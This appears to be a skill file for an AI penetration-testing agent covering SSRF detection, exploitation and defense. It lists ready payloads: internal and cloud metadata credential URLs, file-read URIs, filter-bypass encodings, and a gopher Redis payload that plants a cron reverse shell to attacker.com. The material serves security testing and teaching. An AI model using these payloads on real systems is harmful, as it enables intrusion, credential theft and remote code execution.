---
name: ssrf-testing
description: Professional skills and methodology for SSRF (Server-Side Request Forgery) testing
version: 1.0.0
---

# SSRF (Server-Side Request Forgery) Testing

## Overview

SSRF (Server-Side Request Forgery) is a vulnerability that abuses the server to initiate requests, allowing access to internal resources, port scanning, or firewall bypass. This skill provides methods for detecting, exploiting, and defending against SSRF vulnerabilities.

## Vulnerability Principle

The application accepts a URL parameter and requests that URL. An attacker can control the request target, leading to:
- Internal resource access
- Local file reading
- Port scanning
- Firewall bypass
- Cloud service metadata access

## Testing Methodology

### 1. Identify SSRF Input Points

**Common features:**
- URL preview/screenshot
- File upload (remote URL)
- Webhook callback
- API proxy
- Data import
- Image processing
- PDF generation

### 2. Basic Detection

**Test local loopback:**
```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
```

**Test internal IPs:**
```
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1
```

**Test the file protocol:**
```
file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
```

### 3. Bypass Techniques

**IP address encoding:**
```
127.0.0.1 → 2130706433 (decimal)
127.0.0.1 → 0x7f000001 (hexadecimal)
127.0.0.1 → 0177.0.0.1 (octal)
```

**DNS resolution bypass:**
```
127.0.0.1.xip.io
127.0.0.1.nip.io
localtest.me
```

**URL redirect:**
```
http://attacker.com/redirect → http://127.0.0.1
```

**Protocol confusion:**
```
http://127.0.0.1:80@evil.com
http://evil.com#@127.0.0.1
```

## Exploitation Techniques

### Internal Network Probing

**Port scanning:**
```bash
# Use Burp Intruder
http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:6379
http://127.0.0.1:8080
http://127.0.0.1:9200
```

**Service identification:**
- Response time differences
- Error messages
- HTTP status codes
- Response content

### Cloud Service Metadata

**AWS EC2:**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Google Cloud:**
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
```

**Azure:**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01
```

**Alibaba Cloud:**
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

### Attacking Internal Applications

**Accessing admin consoles:**
```
http://127.0.0.1:8080/admin
http://192.168.1.100/phpmyadmin
```

**Redis unauthorized access:**
```
http://127.0.0.1:6379
# Then send Redis commands
```

**FastCGI attack:**
```
http://127.0.0.1:9000
# Execute commands via the FastCGI protocol
```

## Advanced Exploitation

### Gopher Protocol

**Sending arbitrary protocol data:**
```
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aquit%0d%0a
```

**Redis command execution:**
```
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
```

### Dict Protocol

**Port scanning and information gathering:**
```
dict://127.0.0.1:6379/info
dict://127.0.0.1:3306/status
```

### File Protocol

**Reading local files:**
```
file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///proc/self/environ
```

## Tool Usage

### SSRFmap

```bash
# Basic scan
python3 ssrfmap.py -r request.txt -p url

# Port scan
python3 ssrfmap.py -r request.txt -p url -m portscan

# Cloud metadata
python3 ssrfmap.py -r request.txt -p url -m cloud
```

### Gopherus

```bash
# Generate Gopher payload
python gopherus.py --exploit redis
```

### Burp Collaborator

**Detecting blind SSRF:**
```
http://burpcollaborator.net
# Observe whether any DNS/HTTP requests occur
```

## Verification and Reporting

### Verification Steps

1. Confirm that the request target can be controlled
2. Verify internal resource access or port scanning
3. Assess the scope of impact (internal network pivoting, data leakage, etc.)
4. Record a complete PoC
5. Submit confirmed vulnerabilities to the platform via the `report_finding` tool (the sole entry point for recording vulnerabilities on this platform), covering fields such as location, type, severity, reproduction steps/PoC, and remediation recommendations

### Reporting Key Points

- Vulnerability location and input parameter
- Accessible internal resources or ports
- Complete exploitation steps and PoC
- Remediation recommendations (URL allowlist, disabling dangerous protocols, etc.)

## Defensive Measures

### Recommended Approaches

1. **URL allowlist**
   ```python
   ALLOWED_DOMAINS = ['example.com', 'cdn.example.com']
   parsed = urlparse(url)
   if parsed.netloc not in ALLOWED_DOMAINS:
       raise ValueError("Domain not allowed")
   ```

2. **Disable dangerous protocols**
   - Allow only http/https
   - Forbid file://, gopher://, dict://, etc.

3. **IP address filtering**
   ```python
   import ipaddress
   
   def is_internal_ip(ip):
       return ipaddress.ip_address(ip).is_private or \
              ipaddress.ip_address(ip).is_loopback
   ```

4. **Validate with DNS resolution**
   - Resolve the domain to obtain the IP
   - Verify whether the IP falls within the internal range

5. **Network isolation**
   - Restrict the server's outbound access
   - Use a proxy server

## Notes

- Only perform in authorized test environments
- Avoid affecting internal systems
- Note the varying levels of protocol support
- Watch the request rate during testing to avoid triggering defenses
